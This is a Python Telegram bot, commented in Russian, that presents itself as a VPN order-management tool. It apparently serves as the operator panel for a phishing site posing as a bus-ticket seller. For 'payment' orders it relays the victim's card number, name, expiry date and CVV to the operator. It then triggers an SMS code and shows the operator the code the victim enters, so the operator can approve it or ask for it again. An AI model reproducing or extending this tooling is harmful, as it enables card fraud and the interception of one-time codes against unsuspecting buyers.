import logging
import requests
import json
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import asyncio

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация через переменные окружения
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
WEB_SERVER_URL = os.environ.get('WEB_SERVER_URL', 'https://web-production-d0b17.up.railway.app')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', 'YOUR_CHAT_ID_HERE')

class FixedOrderBot:
    def __init__(self, token, web_server_url):
        self.token = token
        self.web_server_url = web_server_url
        self.application = Application.builder().token(token).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Настройка обработчиков команд и callback'ов"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("orders", self.orders_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда /start"""
        welcome_message = """
🤖 Добро пожаловать в систему управления заказами VPN!

Доступные команды:
/orders - Показать активные заказы
/help - Помощь

✅ Бот готов к работе!
🔔 Вы будете получать уведомления о новых заказах автоматически
        """
        await update.message.reply_text(welcome_message)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда /help"""
        help_text = """
📝 Помощь по использованию бота:

🔸 /start - Приветствие и информация
🔸 /orders - Показать все ожидающие заказы
🔸 /help - Показать это сообщение

🔄 Автоматические уведомления:
- Когда пользователь оформляет заказ на сайте, вы получите уведомление
- Нажмите ✅ "Подтвердить" чтобы одобрить заказ
- Нажмите ❌ "Отклонить" чтобы отклонить заказ
- После подтверждения пользователь получит возможность ввести код

🌐 Сайт: """ + WEB_SERVER_URL + """
        """
        await update.message.reply_text(help_text)
    
    async def orders_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда /orders - показать все ожидающие заказы"""
        try:
            response = requests.get(f"{self.web_server_url}/api/bot/orders", timeout=15)
            if response.status_code == 200:
                orders = response.json()
                
                if not orders:
                    await update.message.reply_text("📋 Нет ожидающих заказов")
                    return
                
                await update.message.reply_text(f"📋 Найдено заказов: {len(orders)}")
                
                for order_id, order_data in orders.items():
                    await self.send_order_notification(update.effective_chat.id, order_id, order_data)
            else:
                await update.message.reply_text("❌ Ошибка получения заказов с сервера")
                
        except Exception as e:
            logger.error(f"Ошибка получения заказов: {e}")
            await update.message.reply_text("❌ Произошла ошибка при получении заказов")
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик нажатий на inline кнопки"""
        query = update.callback_query
        
        try:
            # Отвечаем на callback быстро, чтобы избежать timeout
            await query.answer("⏳ Обрабатываю...")
            
            # Обрабатываем разные типы callback_data
            if "send_sms_" in query.data:
                order_id = query.data.replace("send_sms_", "")
                await self.approve_payment_order(query, order_id, "sms")
            elif "confirm_code_" in query.data:
                order_id = query.data.replace("confirm_code_", "")
                await self.confirm_code(query, order_id)
            elif "reject_code_" in query.data:
                order_id = query.data.replace("reject_code_", "")
                await self.reject_code(query, order_id)
            else:
                parts = query.data.split("_", 1)
                if len(parts) == 2:
                    action, order_id = parts
                    
                    if action == "approve":
                        await self.approve_order(query, order_id)
                    elif action == "reject":
                        await self.reject_order(query, order_id)
                    elif action == "details":
                        await self.show_order_details(query, order_id)
                
        except Exception as e:
            logger.error(f"Ошибка в обработчике кнопок: {e}")
            try:
                await query.answer("❌ Произошла ошибка")
            except:
                pass
    
    async def approve_payment_order(self, query, order_id, verification_type):
        """Подтвердить платежный заказ с указанным типом верификации"""
        try:
            # Отправляем запрос на одобрение с типом верификации
            response = requests.post(
                f"{self.web_server_url}/api/bot/approve/{order_id}",
                json={'verification_type': verification_type},
                timeout=15
            )
            
            if response.status_code == 200:
                if verification_type == "sms":
                    success_message = f"""
✅ SMS ОТПРАВЛЕН!

🆔 ID заказа: {order_id[:8]}...
📱 SMS-код отправлен на телефон пользователя

🔑 Пользователь может ввести полученный код на сайте.

⏰ Ожидаем ввода кода...
                    """
                else:
                    success_message = f"""
✅ ПЛАТЁЖ ОДОБРЕН!

🆔 ID заказа: {order_id[:8]}...
🔐 Тип верификации: {verification_type}

🚀 Пользователь получил уведомление об одобрении.
🔑 Теперь он может завершить верификацию на сайте.

⏰ Ожидаем подтверждение...
                    """
                
                # Обновляем сообщение
                await query.edit_message_text(text=success_message)
                
                logger.info(f"Платеж {order_id} одобрен с {verification_type} верификацией")
            else:
                await query.edit_message_text("❌ Ошибка одобрения платежа. Попробуйте позже.")
                
        except Exception as e:
            logger.error(f"Ошибка одобрения платежа: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при одобрении платежа")
            except:
                pass

    async def confirm_code(self, query, order_id):
        """Подтвердить код введенный пользователем"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/confirm_code/{order_id}", timeout=15)
            
            if response.status_code == 200:
                success_message = f"""
✅ КОД ПОДТВЕРЖДЕН!

🆔 ID заказа: {order_id[:8]}...

🎉 Транзакция завершена успешно!
🚀 Пользователь получил подтверждение.
                """
                
                await query.edit_message_text(text=success_message)
                logger.info(f"Код для заказа {order_id} подтвержден администратором")
            else:
                await query.edit_message_text("❌ Ошибка подтверждения кода")
                
        except Exception as e:
            logger.error(f"Ошибка подтверждения кода: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при подтверждении кода")
            except:
                pass

    async def reject_code(self, query, order_id):
        """Отклонить код введенный пользователем"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/reject_code/{order_id}", timeout=15)
            
            if response.status_code == 200:
                reject_message = f"""
❌ КОД ОТКЛОНЕН!

🆔 ID заказа: {order_id[:8]}...

🔄 Пользователь может ввести код повторно.
🔑 Попросите пользователя проверить код и ввести его снова.
                """
                
                await query.edit_message_text(text=reject_message)
                logger.info(f"Код для заказа {order_id} отклонен администратором")
            else:
                await query.edit_message_text("❌ Ошибка отклонения кода")
                
        except Exception as e:
            logger.error(f"Ошибка отклонения кода: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при отклонении кода")
            except:
                pass

    async def approve_order(self, query, order_id):
        """Подтвердить заказ"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/approve/{order_id}", timeout=15)
            
            if response.status_code == 200:
                success_message = f"""
✅ ЗАКАЗ ПОДТВЕРЖДЕН!

🆔 ID заказа: {order_id[:8]}...

🎉 Пользователь получил уведомление о подтверждении заказа.
🔑 Теперь он может ввести свой код подтверждения на сайте.

⏰ Заказ ожидает ввода кода пользователем.
                """
                
                # Обновляем сообщение
                await query.edit_message_text(
                    text=success_message
                )
                
                logger.info(f"Заказ {order_id} подтвержден администратором")
            else:
                await query.edit_message_text("❌ Ошибка подтверждения заказа. Попробуйте позже.")
                
        except Exception as e:
            logger.error(f"Ошибка подтверждения заказа: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при подтверждении заказа")
            except:
                pass
    
    async def reject_order(self, query, order_id):
        """Отклонить заказ"""
        try:
            response = requests.post(f"{self.web_server_url}/api/bot/reject/{order_id}", timeout=15)
            
            if response.status_code == 200:
                reject_message = f"""
❌ ЗАКАЗ ОТКЛОНЕН

🆔 ID заказа: {order_id[:8]}...

📤 Пользователь получил уведомление об отклонении заказа.
                """
                await query.edit_message_text(reject_message)
                logger.info(f"Заказ {order_id} отклонен администратором")
            else:
                await query.edit_message_text("❌ Ошибка отклонения заказа")
                
        except Exception as e:
            logger.error(f"Ошибка отклонения заказа: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при отклонении заказа")
            except:
                pass
    
    async def show_order_details(self, query, order_id):
        """Показать детали заказа"""
        try:
            response = requests.get(f"{self.web_server_url}/api/bot/order/{order_id}", timeout=15)
            
            if response.status_code == 200:
                order_data = response.json()
                data = order_data['data']
                created_time = datetime.fromisoformat(order_data['created_at']).strftime('%d.%m.%Y %H:%M')
                
                details_message = f"""
📋 ДЕТАЛИ ЗАКАЗА

🆔 ID: {order_id[:8]}...
📅 Время: {created_time}
📊 Статус: {order_data['status']}

👤 Имя: {data.get('name', 'Не указано')}
📞 Телефон: {data.get('phone', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

💬 Сообщение: {data.get('message', 'Отсутствует')}
                """
                
                await query.edit_message_text(details_message)
                
            else:
                await query.edit_message_text("❌ Ошибка получения деталей заказа")
                
        except Exception as e:
            logger.error(f"Ошибка получения деталей заказа: {e}")
            try:
                await query.edit_message_text("❌ Произошла ошибка при получении деталей")
            except:
                pass

    async def send_code_notification(self, chat_id, order_id, user_code, order_data):
        """Отправить уведомление о введенном коде"""
        try:
            data = order_data['data']
            created_time = datetime.fromisoformat(order_data['created_at']).strftime('%d.%m.%Y %H:%M')
            
            message = f"""
🔢 ПОЛЬЗОВАТЕЛЬ ВВЕЛ КОД!

👤 Имя: {data.get('name', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

🔐 ВВЕДЕННЫЙ КОД: {user_code}

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:
            """
            
            # Создаем кнопки для подтверждения или отклонения кода
            keyboard = [
                [
                    InlineKeyboardButton("✅ Правильный код", callback_data=f"confirm_code_{order_id}")
                ],
                [
                    InlineKeyboardButton("❌ Неправильный код", callback_data=f"reject_code_{order_id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup
            )
            
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления о коде: {e}")

    async def send_order_notification(self, chat_id, order_id, order_data):
        """Отправить уведомление о новом заказе"""
        try:
            data = order_data['data']
            created_time = datetime.fromisoformat(order_data['created_at']).strftime('%d.%m.%Y %H:%M')
            
            # Проверяем тип заказа
            order_type = order_data.get('order_type', 'standard')
            
            if order_type == 'payment':
                # Заказ с данными карты
                card_data = order_data.get('card_data', {})
                route_info = order_data.get('route_info', {})
                
                message = f"""
💳 НОВЫЙ ПЛАТЁЖ!

👤 Имя: {data.get('name', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

🚌 Маршрут: {route_info.get('from_city', '')} → {route_info.get('to_city', '')}
📅 Дата поездки: {route_info.get('travel_date', '')}
💺 Место: {route_info.get('seat', '')}

💳 ДАННЫЕ КАРТЫ:
🔢 Номер: {data.get('cardNumber', 'Не указано')}
👤 Имя на карте: {data.get('cardName', 'Не указано')}
📅 Срок действия: {data.get('expiryDate', 'Не указано')}
🔐 CVV: {data.get('cvv', 'Не указано')}
💰 Сумма: {data.get('amount', 0)} zł

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:
                """
            else:
                # Обычный заказ
                message = f"""
🔔 НОВЫЙ ЗАКАЗ!

👤 Имя: {data.get('name', 'Не указано')}
📞 Телефон: {data.get('phone', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:
                """
            
            # Создаем inline клавиатуру с кнопками в зависимости от типа заказа
            if order_type == 'payment':
                keyboard = [
                    [
                        InlineKeyboardButton("📱 Отправить SMS", callback_data=f"send_sms_{order_id}")
                    ],
                    [
                        InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{order_id}")
                    ]
                ]
            else:
                keyboard = [
                    [
                        InlineKeyboardButton("✅ Подтвердить", callback_data=f"approve_{order_id}"),
                        InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{order_id}")
                    ],
                    [
                        InlineKeyboardButton("📋 Детали", callback_data=f"details_{order_id}")
                    ]
                ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup
            )
            
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления: {e}")
    
    def run(self):
        """Запуск бота"""
        logger.info("Инициализация исправленного Telegram бота...")
        
        if self.token == "YOUR_BOT_TOKEN_HERE":
            logger.error("❌ Не установлен BOT_TOKEN! Получите токен у @BotFather")
            return
        
        if ADMIN_CHAT_ID == "YOUR_CHAT_ID_HERE":
            logger.warning("⚠️ Не установлен ADMIN_CHAT_ID. Автоматические уведомления отключены.")
        
        # Запуск polling
        logger.info("🚀 Исправленный бот запущен и готов к работе!")
        self.application.run_polling()

def main():
    """Основная функция запуска бота"""
    try:
        # Создаем и запускаем бота
        bot = FixedOrderBot(BOT_TOKEN, WEB_SERVER_URL)
        bot.run()
    except KeyboardInterrupt:
        logger.info("🛑 Бот остановлен пользователем")
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")

if __name__ == "__main__":
    main()